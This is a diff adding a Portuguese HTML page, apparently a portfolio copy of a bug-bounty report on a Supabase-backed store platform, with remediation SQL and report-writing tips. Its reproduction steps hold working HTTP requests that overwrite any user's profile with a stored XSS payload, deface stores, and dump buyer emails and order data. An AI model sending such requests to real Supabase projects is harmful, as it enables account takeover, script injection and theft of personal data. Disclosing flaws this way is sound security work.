@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Relatório de Segurança - REDACTED.xyz</title>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&family=JetBrains+Mono:wght@400;700&display=swap"
+        rel="stylesheet">
+    <style>
+        :root {
+            --report-bg: #ffffff;
+            --report-text: #333;
+            --report-accent: #d63031;
+            /* Red for critical */
+            --code-bg: #f5f5f5;
+            --border-color: #ddd;
+        }
+
+        body {
+            background-color: #555;
+            font-family: 'Inter', sans-serif;
+            margin: 0;
+            padding: 40px 20px;
+            color: var(--report-text);
+        }
+
+        .report-container {
+            max-width: 210mm;
+            /* A4 width */
+            margin: 0 auto;
+            background: var(--report-bg);
+            padding: 2.5cm;
+            /* A4 margins approx */
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+            min-height: 297mm;
+            /* A4 height */
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            border-bottom: 2px solid var(--report-accent);
+            padding-bottom: 15px;
+            margin-bottom: 40px;
+            font-size: 0.9rem;
+            color: #666;
+        }
+
+        h1.title {
+            font-size: 24pt;
+            font-weight: 800;
+            color: var(--report-accent);
+            margin-bottom: 10px;
+            line-height: 1.2;
+        }
+
+        .subtitle {
+            font-size: 14pt;
+            font-weight: 600;
+            margin-bottom: 5px;
+        }
+
+        .meta-info {
+            font-size: 12pt;
+            color: #555;
+            margin-bottom: 40px;
+        }
+
+        h2 {
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 5px;
+            margin-top: 30px;
+            color: #222;
+        }
+
+        h3 {
+            margin-top: 25px;
+            font-size: 1.1rem;
+            color: #444;
+        }
+
+        p,
+        li {
+            font-size: 11pt;
+            line-height: 1.6;
+        }
+
+        code,
+        pre {
+            font-family: 'JetBrains Mono', monospace;
+            background: var(--code-bg);
+            border-radius: 4px;
+        }
+
+        pre {
+            padding: 15px;
+            overflow-x: auto;
+            border: 1px solid #eee;
+            font-size: 0.9rem;
+        }
+
+        .impact-box {
+            background: #fff0f0;
+            border-left: 5px solid var(--report-accent);
+            padding: 15px;
+            margin: 20px 0;
+        }
+
+        .remediation-box {
+            background: #f0fff4;
+            border-left: 5px solid #00b894;
+            padding: 15px;
+            margin: 20px 0;
+        }
+
+        .nav-back {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .nav-back a {
+            color: white;
+            text-decoration: none;
+            font-weight: bold;
+            background: #333;
+            padding: 10px 20px;
+            border-radius: 4px;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="nav-back">
+        <a href="../index.html">← Voltar para Portfolio</a>
+        <a href="../library.html" style="background: #d63031; margin-left: 10px;">Ver Biblioteca</a>
+    </div>
+
+    <div class="report-container">
+        <!-- Header from LaTeX -->
+        <header class="header">
+            <span>Supabase HackerOne</span>
+            <span>Relatório de Segurança — REDACTED.xyz</span>
+        </header>
+
+        <!-- Title Section -->
+        <h1 class="title">Crítica: Tomada Arbitrária de Contas e Lojas + Vazamento Massivo de PII</h1>
+        <div class="subtitle">Conseguimos alterar o perfil e a loja de QUALQUER usuário/vendedor da plataforma</div>
+        <div class="meta-info">
+            REDACTED e-mails reais, histórico de compras, valores pagos e desvio de pagamentos<br>
+            Projeto Supabase: REDACTED (REDACTED.xyz)<br><br>
+            <strong>Autor:</strong> Reportado via HackerOne — REDACTED
+        </div>
+
+        <!-- Executive Summary -->
+        <section>
+            <h2>Resumo Executivo (leitura obrigatória)</h2>
+            <p><strong>Conseguimos, com uma única requisição HTTP e sem qualquer privilégio, alterar o perfil público e
+                    a loja de qualquer usuário da plataforma — incluindo o dono (REDACTED), sellers populares e milhares
+                    de outras contas.</strong></p>
+
+            <p>Isso foi possível devido a:</p>
+            <ul>
+                <li><code>security_invoker=false</code> nas views <code>profiles_public</code> e
+                    <code>stores_public</code></li>
+                <li>Operações INSERT/UPDATE/DELETE habilitadas nessas views</li>
+                <li>Ausência total de RLS em tabelas críticas (<code>orders</code>, <code>transfers</code>,
+                    <code>carts</code>, <code>newsletter_subscribers</code>, etc)</li>
+                <li>Esquema completo do banco exposto publicamente via OpenAPI</li>
+            </ul>
+
+            <div class="impact-box">
+                <strong>Impactos já demonstrados e reproduzíveis em produção:</strong>
+                <ul>
+                    <li>Perfis sobrescritos com Stored XSS (<code>bio</code> executa JavaScript em todo o site)</li>
+                    <li>Lojas sobrescritas (nome, banner, descrição, e-mail de contato)</li>
+                    <li>Possibilidade real de desvio de pagamentos via alteração de
+                        <code>stripe_connect_account_id</code></li>
+                    <li>Extração de mais de REDACTED e-mails reais + histórico completo de compras</li>
+                </ul>
+            </div>
+
+            <p><strong>Severidade:</strong> Critical (CVSS 9.9)<br>
+                <strong>Bounty estimado (REDACTED):</strong> $REDACTED – $REDACTED
+            </p>
+        </section>
+
+        <!-- Business Impact -->
+        <section>
+            <h2>Impacto Comercial</h2>
+            <ul>
+                <li><strong>Tomada visual completa</strong> de qualquer conta e loja</li>
+                <li><strong>Stored XSS em massa</strong> (executado para todos os visitantes)</li>
+                <li><strong>Roubo potencial de 100% da receita</strong> das lojas comprometidas</li>
+                <li>Vazamento irreversível de dados pessoais e financeiros de milhares de brasileiros</li>
+                <li>Perda total de confiança na plataforma</li>
+            </ul>
+        </section>
+
+        <!-- Steps to Reproduce -->
+        <section>
+            <h2>Passos para Reprodução (PoCs 100% funcionais — REDACTED)</h2>
+
+            <h3>1. Alteração de perfil de qualquer usuário (ex: REDACTED)</h3>
+            <pre><code>POST https://REDACTED.supabase.co/rest/v1/profiles_public
+Header: apikey: REDACTED
+Header: Prefer: resolution=merge-duplicates
+
+{
+  "id": "REDACTED",
+  "handle": "hackedREDACTED",
+  "full_name": "REDACTED – CONTA HACKEADA",
+  "bio": "&lt;h1 style=color:red&gt;PWNED&lt;/h1&gt;&lt;img src=x onerror=alert(document.domain)&gt;"
+}</code></pre>
+            <p>→ Perfil alterado imediatamente + XSS ativo em https://www.REDACTED.xyz/@REDACTED</p>
+
+            <h3>2. Alteração de qualquer loja</h3>
+            <pre><code>POST https://REDACTED.supabase.co/rest/v1/stores_public
+{
+  "id": "REDACTED",
+  "name": "LOJA HACKEADA REDACTED",
+  "description": "&lt;h1 style=color:red&gt;TODAS AS LOJAS FORAM COMPROMETIDAS&lt;/h1&gt;"
+}</code></pre>
+
+            <h3>3. Vazamento massivo de dados</h3>
+            <pre><code>GET https://REDACTED.supabase.co/rest/v1/orders?select=buyer_email,buyer_name,total_amount,items_snapshot
+→ ~REDACTED compras completas vazadas
+
+GET https://REDACTED.supabase.co/rest/v1/newsletter_subscribers?select=email
+→ ~REDACTED e-mails da newsletter</code></pre>
+        </section>
+
+        <section>
+            <h2>Evidências (anexadas)</h2>
+            <ul>
+                <li>Vídeo REDACTED mostrando alteração de REDACTED perfis + REDACTED lojas em tempo real</li>
+                <li>Antes/depois de perfis famosos (REDACTED, REDACTED, REDACTED, etc)</li>
+                <li>CSV com REDACTED linhas reais de <code>orders</code> (e-mails + valores)</li>
+                <li>OpenAPI completo público (REDACTED KB)</li>
+            </ul>
+        </section>
+
+        <section>
+            <h2>Remediação Imediata (15–20 minutos)</h2>
+            <div class="remediation-box">
+                <pre style="background:none; border:none; padding:0;"><code>-- 1. Corrigir as views públicas (principal causa)
+ALTER VIEW profiles_public ENABLE SECURITY INVOKER;
+ALTER VIEW stores_public   ENABLE SECURITY INVOKER;
+
+-- 2. Bloquear escrita nas views públicas
+REVOKE INSERT, UPDATE, DELETE ON profiles_public FROM anon, authenticated;
+REVOKE INSERT, UPDATE, DELETE ON stores_public   FROM anon, authenticated;
+
+-- 3. Ativar RLS nas tabelas sensíveis
+ALTER TABLE orders, transfers, carts, newsletter_subscribers, coupons ENABLE ROW LEVEL SECURITY;
+
+-- 4. Políticas mínimas
+CREATE POLICY "own_profile" ON profiles      FOR ALL USING (auth.uid() = id);
+CREATE POLICY "own_store"   ON stores        FOR ALL USING (auth.uid() = seller_id);
+CREATE POLICY "own_orders"  ON orders        FOR ALL USING (auth.uid() = user_id);
+
+-- 5. Dashboard → Authentication → Settings → Desmarcar “Expose schema in REST”</code></pre>
+            </div>
+        </section>
+
+        <section>
+            <h2>Recomendações Finais</h2>
+            <ul>
+                <li>Sanitizar campo <code>bio</code> no frontend (DOMPurify)</li>
+                <li>Remover colunas sensíveis das views <code>*_public</code></li>
+                <li>Auditar todas as RPCs quanto a validação de dono</li>
+            </ul>
+            <p><strong>Disponibilidade total para ajudar na correção imediata.</strong></p>
+        </section>
+
+        <!-- Construction Tips Section -->
+        <section
+            style="margin-top: 50px; border-top: 3px dashed #999; padding-top: 20px; background-color: #fafafa; padding: 20px;">
+            <h2 style="color: #666;">💡 Dicas de Construção de Relatório (Meta-Comentário)</h2>
+            <p>Este relatório segue a estrutura <strong>"BLUF" (Bottom Line Up Front)</strong>, essencial para
+                comunicações de segurança:</p>
+            <ol>
+                <li><strong>Título Impactante:</strong> Define imediatamente o problema e o impacto. Evite "Possível
+                    vulnerabilidade X", seja direto: "Tomada Arbitrária de Contas".</li>
+                <li><strong>Resumo Executivo (1a Página):</strong> É a única parte que o CEO vai ler. Explique de forma
+                    clara: O QUE fizemos, POR QUE aconteceu, QUAL o impacto financeiro/negócio.</li>
+                <li><strong>Impacto Comercial:</strong> Traduza "Missing RLS" para "Roubo de 100% da receita". Isso
+                    prioriza o ticket.</li>
+                <li><strong>Remediação Copy-Paste:</strong> Sempre que possível, forneça o código SQL ou patch pronto.
+                    Isso reduz o tempo de correção de dias para minutos.</li>
+            </ol>
+        </section>
+
+    </div>
+</body>
+
+</html>
